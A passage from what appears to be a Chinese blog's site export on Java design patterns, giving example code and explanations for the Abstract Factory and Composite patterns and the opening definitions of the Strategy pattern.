<h3 id="Item"><a href="#Item" class="headerlink" title="Item"></a>Item</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Item</span> </span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> String caption;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Item</span><span class="params">(String caption)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.caption = caption;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title">makeHTML</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Link"><a href="#Link" class="headerlink" title="Link"></a>Link</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Link</span> <span class="keyword">extends</span> <span class="title">Item</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">protected</span> String url;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Link</span><span class="params">(String caption, String url)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(caption);</span><br><span class="line">		<span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">		<span class="keyword">this</span>.url = url;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Tray"><a href="#Tray" class="headerlink" title="Tray"></a>Tray</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Tray</span> <span class="keyword">extends</span> <span class="title">Item</span> </span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> ArrayList&lt;Item&gt; tray = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Tray</span><span class="params">(String caption)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(caption);</span><br><span class="line">		<span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(Item item)</span> </span>&#123;</span><br><span class="line">		tray.add(item);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Page"><a href="#Page" class="headerlink" title="Page"></a>Page</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Page</span> </span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> String title;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">protected</span> String author;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">protected</span> ArrayList&lt;Item&gt; content = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Page</span><span class="params">(String title, String author)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.title = title;</span><br><span class="line">		<span class="keyword">this</span>.author = author;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(Item item)</span> </span>&#123;</span><br><span class="line">		content.add(item);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">output</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			String fileName = title + <span class="string">".html"</span>;</span><br><span class="line">			Writer writer = <span class="keyword">new</span> FileWriter(fileName);</span><br><span class="line">			writer.write(<span class="keyword">this</span>.makeHTML());</span><br><span class="line">			writer.close();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title">makeHTML</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Factory"><a href="#Factory" class="headerlink" title="Factory"></a>Factory</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Factory</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Factory <span class="title">getFactory</span><span class="params">(String className)</span> </span>&#123;</span><br><span class="line">		Factory factory = <span class="keyword">null</span>;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			factory = (Factory) Class.forName(className).newInstance();</span><br><span class="line">		&#125; <span class="keyword">catch</span>(ClassNotFoundException e) &#123;</span><br><span class="line">			System.err.println(<span class="string">"没有找到 "</span> + className + <span class="string">"类"</span>);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> factory;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> Link <span class="title">createLink</span><span class="params">(String caption, String url)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> Tray <span class="title">createTray</span><span class="params">(String caption)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> Page <span class="title">createPage</span><span class="params">(String title, String author)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ListLink"><a href="#ListLink" class="headerlink" title="ListLink"></a>ListLink</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ListLink</span> <span class="keyword">extends</span> <span class="title">Link</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">ListLink</span><span class="params">(String caption, String url)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(caption, url);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">makeHTML</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">" &lt;li&gt;&lt;a href=\""</span> + url + <span class="string">"\"&gt;"</span> + caption + <span class="string">"&lt;/a&gt;&lt;/li&gt;\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ListTray"><a href="#ListTray" class="headerlink" title="ListTray"></a>ListTray</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ListTray</span> <span class="keyword">extends</span> <span class="title">Tray</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">ListTray</span><span class="params">(String caption)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(caption);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">makeHTML</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		StringBuffer buffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">		buffer.append(<span class="string">"&lt;li&gt;\n"</span>);</span><br><span class="line">		buffer.append(caption + <span class="string">"\n"</span>);</span><br><span class="line">		buffer.append(<span class="string">"&lt;ul&gt;\n"</span>);</span><br><span class="line">		Iterator&lt;Item&gt; it = tray.iterator();</span><br><span class="line">		<span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">			Item item = it.next();</span><br><span class="line">			buffer.append(item.makeHTML());</span><br><span class="line">		&#125;</span><br><span class="line">		buffer.append(<span class="string">"&lt;/ul&gt;\n"</span>);</span><br><span class="line">		buffer.append(<span class="string">"&lt;/li&gt;\n"</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> buffer.toString();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ListPage"><a href="#ListPage" class="headerlink" title="ListPage"></a>ListPage</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ListPage</span> <span class="keyword">extends</span> <span class="title">Page</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">ListPage</span><span class="params">(String title, String author)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(title, author);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">makeHTML</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		StringBuffer buffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">		buffer.append(<span class="string">"&lt;html&gt;&lt;head&gt;&lt;title&gt;"</span> + title + <span class="string">"&lt;/title&gt;&lt;/head&gt;\n"</span>);</span><br><span class="line">		buffer.append(<span class="string">"&lt;body&gt;\n"</span>);</span><br><span class="line">		buffer.append(<span class="string">"&lt;h1&gt;"</span> + title + <span class="string">"&lt;/h1&gt;\n"</span>);</span><br><span class="line">		buffer.append(<span class="string">"&lt;ul&gt;\n"</span>);</span><br><span class="line">		Iterator&lt;Item&gt; it = content.iterator();</span><br><span class="line">		<span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">			Item item = it.next();</span><br><span class="line">			buffer.append(item.makeHTML());</span><br><span class="line">		&#125;</span><br><span class="line">		buffer.append(<span class="string">"&lt;/ul&gt;\n"</span>);</span><br><span class="line">		buffer.append(<span class="string">"&lt;hr&gt;&lt;address&gt;"</span> + author + <span class="string">"&lt;/address&gt;"</span>);</span><br><span class="line">		buffer.append(<span class="string">"&lt;/body&gt;&lt;/html&gt;\n"</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> buffer.toString();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ListFactory"><a href="#ListFactory" class="headerlink" title="ListFactory"></a>ListFactory</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ListFactory</span> <span class="keyword">extends</span> <span class="title">Factory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Link <span class="title">createLink</span><span class="params">(String caption, String url)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> ListLink(caption, url);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Tray <span class="title">createTray</span><span class="params">(String caption)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> ListTray(caption);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Page <span class="title">createPage</span><span class="params">(String title, String author)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> ListPage(title, author);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (args.length != <span class="number">1</span>) &#123;</span><br><span class="line">			System.out.println(<span class="string">"Usage java Main class.name.of.ConcreteFactory"</span>);</span><br><span class="line">			System.out.println(<span class="string">"Example 1: java Main listfactory.ListFactory"</span>);</span><br><span class="line">			System.out.println(<span class="string">"Example 2: java Main tablefactory.TableFactory"</span>);</span><br><span class="line">			System.exit(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		Factory factory = Factory.getFactory(args[<span class="number">0</span>]);</span><br><span class="line">		</span><br><span class="line">		Link people = factory.createLink(<span class="string">"人民日报"</span>, <span class="string">"1"</span>);</span><br><span class="line">		Link gmw = factory.createLink(<span class="string">"光明日报"</span>, <span class="string">"2"</span>);</span><br><span class="line">		Link us_yahoo = factory.createLink(<span class="string">"美国雅虎"</span>, <span class="string">"3"</span>);</span><br><span class="line">		Link cn_yahoo = factory.createLink(<span class="string">"中国亚虎"</span>, <span class="string">"4"</span>);</span><br><span class="line">		Link excite = factory.createLink(<span class="string">"Excite"</span>, <span class="string">"5"</span>);</span><br><span class="line">		Link google = factory.createLink(<span class="string">"Google"</span>, <span class="string">"6"</span>);</span><br><span class="line">		</span><br><span class="line">		Tray traynews = factory.createTray(<span class="string">"日报"</span>);</span><br><span class="line">		traynews.add(people);</span><br><span class="line">		traynews.add(gmw);</span><br><span class="line">		</span><br><span class="line">		Tray trayYahoo = factory.createTray(<span class="string">"雅虎"</span>);</span><br><span class="line">		trayYahoo.add(us_yahoo);</span><br><span class="line">		trayYahoo.add(cn_yahoo);</span><br><span class="line">		</span><br><span class="line">		Tray traySearch = factory.createTray(<span class="string">"搜索引擎"</span>);</span><br><span class="line">		traySearch.add(trayYahoo);</span><br><span class="line">		traySearch.add(excite);</span><br><span class="line">		traySearch.add(google);</span><br><span class="line">		</span><br><span class="line">		Page page = factory.createPage(<span class="string">"LinkPage"</span>, <span class="string">"XXX"</span>);</span><br><span class="line">		page.add(traynews);</span><br><span class="line">		page.add(traySearch);</span><br><span class="line">		page.output();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在抽象工厂模式中增加具体的工厂是非常容易的。假设我们要在示例程序中增加新的具体工厂，那么需要做的就是编写Factory、Link、Tray、Page这4个类的子类，并实现它们定义的抽象方法。</p>
<p>但是要增加新的零件是比较困难的。如果要增加一个Picture零件的话，需要对所有具体工厂进行修改才行。已经完成的具体工厂类越多，修改的工作量就越大</p>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
        <tag>抽象工厂模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式-组合模式</title>
    <url>/2020/04/09/Java/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="组合模式"><a href="#组合模式" class="headerlink" title="组合模式"></a>组合模式</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>组合模式（Composite Pattern），又叫部分整体模式，是用于把一组相似的对象当作一个单一的对象。组合模式依据树形结构来组合对象，用来表示部分以及整体层次。这种类型的设计模式属于结构型模式，它创建了对象组的树形结构。</p>
<p>这种模式创建了一个包含自己对象组的类。该类提供了修改相同对象组的方式。</p>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://huhansi.github.io/images/2020-04-08-component1.png" alt="组合模式类图"></p>
<h3 id="Leaf（树叶）"><a href="#Leaf（树叶）" class="headerlink" title="Leaf（树叶）"></a>Leaf（树叶）</h3><p>表示“内容”的角色。在该角色中不能放入其他对象。</p>
<h3 id="Composite（复合物）"><a href="#Composite（复合物）" class="headerlink" title="Composite（复合物）"></a>Composite（复合物）</h3><p>表示容器的角色。可以在其中放入Leaf角色和Composite角色。</p>
<h3 id="Component"><a href="#Component" class="headerlink" title="Component"></a>Component</h3><p>使Leaf角色和Composite角色具有一致性的角色。Composite角色是Leaf角色和Composite角色的父亲。</p>
<h3 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h3><p>使用Composite模式的角色</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="类图-1"><a href="#类图-1" class="headerlink" title="类图"></a>类图</h3><p><img src="https://huhansi.github.io/images/2020-04-08-component2.png" alt="组合模式示例类图"></p>
<h3 id="Entry"><a href="#Entry" class="headerlink" title="Entry"></a>Entry</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Entry</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title">getName</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span></span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> Entry <span class="title">add</span><span class="params">(Entry entry)</span> <span class="keyword">throws</span> FileTreatmentException </span>&#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> FileTreatmentException();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		printList(<span class="string">""</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">printList</span><span class="params">(String prefix)</span></span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> getName() + <span class="string">"("</span> + getSize() + <span class="string">")"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Directory"><a href="#Directory" class="headerlink" title="Directory"></a>Directory</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Directory</span> <span class="keyword">extends</span> <span class="title">Entry</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> String name;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> ArrayList&lt;Entry&gt; directory = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Directory</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="keyword">return</span> name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> size = <span class="number">0</span>;</span><br><span class="line">		Iterator&lt;Entry&gt; it = directory.iterator();</span><br><span class="line">		<span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">			Entry entry = it.next();</span><br><span class="line">			size += entry.getSize();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="keyword">return</span> size;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Entry <span class="title">add</span><span class="params">(Entry entry)</span> </span>&#123;</span><br><span class="line">		directory.add(entry);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">printList</span><span class="params">(String prefix)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		System.out.println(prefix + <span class="string">"/"</span> + <span class="keyword">this</span>);</span><br><span class="line">		Iterator&lt;Entry&gt; it = directory.iterator();</span><br><span class="line">		<span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">			Entry entry = it.next();</span><br><span class="line">			entry.printList(prefix + <span class="string">"/"</span> + name);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="File"><a href="#File" class="headerlink" title="File"></a>File</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">File</span> <span class="keyword">extends</span> <span class="title">Entry</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> String name;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> size;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">File</span><span class="params">(String name, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">		<span class="keyword">this</span>.size = size;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="keyword">return</span> name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="keyword">return</span> size;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">printList</span><span class="params">(String prefix)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		System.out.println(prefix + <span class="string">"/"</span> + <span class="keyword">this</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="FileTreatmentException"><a href="#FileTreatmentException" class="headerlink" title="FileTreatmentException"></a>FileTreatmentException</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileTreatmentException</span> <span class="keyword">extends</span> <span class="title">RuntimeException</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">FileTreatmentException</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">FileTreatmentException</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(msg);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			System.out.println(<span class="string">"Making root entries..."</span>);</span><br><span class="line">			Directory rootDir = <span class="keyword">new</span> Directory(<span class="string">"root"</span>);</span><br><span class="line">			Directory binDir = <span class="keyword">new</span> Directory(<span class="string">"bin"</span>);</span><br><span class="line">			Directory tmpDir = <span class="keyword">new</span> Directory(<span class="string">"tmp"</span>);</span><br><span class="line">			Directory userDir = <span class="keyword">new</span> Directory(<span class="string">"user"</span>);</span><br><span class="line">			</span><br><span class="line">			rootDir.add(binDir);</span><br><span class="line">			rootDir.add(tmpDir);</span><br><span class="line">			rootDir.add(userDir);</span><br><span class="line">			binDir.add(<span class="keyword">new</span> File(<span class="string">"vi"</span>, <span class="number">10000</span>));</span><br><span class="line">			binDir.add(<span class="keyword">new</span> File(<span class="string">"latex"</span>, <span class="number">30000</span>));</span><br><span class="line">			</span><br><span class="line">			rootDir.printList();</span><br><span class="line">			</span><br><span class="line">			System.out.println(<span class="string">""</span>);</span><br><span class="line">			</span><br><span class="line">			System.out.println(<span class="string">"Making user entries..."</span>);</span><br><span class="line">			</span><br><span class="line">			Directory yuki = <span class="keyword">new</span> Directory(<span class="string">"yuki"</span>);</span><br><span class="line">			Directory hanako = <span class="keyword">new</span> Directory(<span class="string">"hanako"</span>);</span><br><span class="line">			Directory tomura = <span class="keyword">new</span> Directory(<span class="string">"tomura"</span>);</span><br><span class="line">			userDir.add(yuki);</span><br><span class="line">			userDir.add(hanako);</span><br><span class="line">			userDir.add(tomura);</span><br><span class="line">			</span><br><span class="line">			yuki.add(<span class="keyword">new</span> File(<span class="string">"1.html"</span>, <span class="number">100</span>));</span><br><span class="line">			yuki.add(<span class="keyword">new</span> File(<span class="string">"2.html"</span>, <span class="number">200</span>));</span><br><span class="line">			hanako.add(<span class="keyword">new</span> File(<span class="string">"3.html"</span>, <span class="number">300</span>));</span><br><span class="line">			tomura.add(<span class="keyword">new</span> File(<span class="string">"4.html"</span>, <span class="number">400</span>));</span><br><span class="line">			tomura.add(<span class="keyword">new</span> File(<span class="string">"5.html"</span>, <span class="number">500</span>));</span><br><span class="line">			</span><br><span class="line">			rootDir.printList();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (FileTreatmentException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
        <tag>组合模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式-策略模式</title>
    <url>/2020/04/09/Java/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="策略模式"><a href="#策略模式" class="headerlink" title="策略模式"></a>策略模式</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>在策略模式（Strategy Pattern）中，一个类的行为或其算法可以在运行时更改。这种类型的设计模式属于行为型模式。</p>
<p>在策略模式中，我们创建表示各种策略的对象和一个行为随着策略对象改变而改变的 context 对象。策略对象改变 context 对象的执行算法。</p>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://huhansi.github.io/images/2020-04-08-strategy1.png" alt="策略模式类图"></p>
<h3 id="Strategy（策略）"><a href="#Strategy（策略）" class="headerlink" title="Strategy（策略）"></a>Strategy（策略）</h3><p>负责决定实现策略锁必需的接口</p>
<h3 id="ConcreteStrategy（具体的策略）"><a href="#ConcreteStrategy（具体的策略）" class="headerlink" title="ConcreteStrategy（具体的策略）"></a>ConcreteStrategy（具体的策略）</h3><p>负责实现Strategy的接口，即负责实现具体的策略</p>
<h3 id="Context（上下文）"><a href="#Context（上下文）" class="headerlink" title="Context（上下文）"></a>Context（上下文）</h3><p>负责使用Strategy。Context保存了ConcreteStrategy的实例，并使用ConcreteStrategy去实现需求</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h3 id="类图-1"><a href="#类图-1" class="headerlink" title="类图"></a>类图</h3><p><img src="https://huhansi.github.io/images/2020-04-08-strategy2.png" alt="策略模式示例类图"></p>
